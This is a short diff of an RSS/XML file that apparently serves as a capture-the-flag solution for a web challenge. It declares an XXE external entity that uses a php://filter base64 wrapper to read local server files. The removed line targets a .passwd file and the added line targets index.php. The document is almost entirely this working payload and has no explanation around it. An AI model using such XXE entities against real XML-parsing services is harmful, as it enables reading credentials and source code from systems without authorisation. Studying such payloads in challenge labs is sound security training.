@@ -2,9 +2,9 @@
 <!DOCTYPE rss [  
 
 <!ELEMENT title ANY >
-<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=file:///challenge/web-serveur/ch29/.passwd" >]>
+<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=file:///challenge/web-serveur/ch29/index.php" >]>
 <rss version="2.0">
-	<channel>
+	<sth>
 		<title>W3Schools Home Page</title>
 		<link>https://www.w3schools.com</link>
 		<description>Free web building tutorials</description>
@@ -18,5 +18,5 @@
 			<link>https://www.w3schools.com/xml</link>
 			<description>New XML tutorial on W3Schools</description>
 		</item>
-	</channel>
+	</sth>
 </rss>
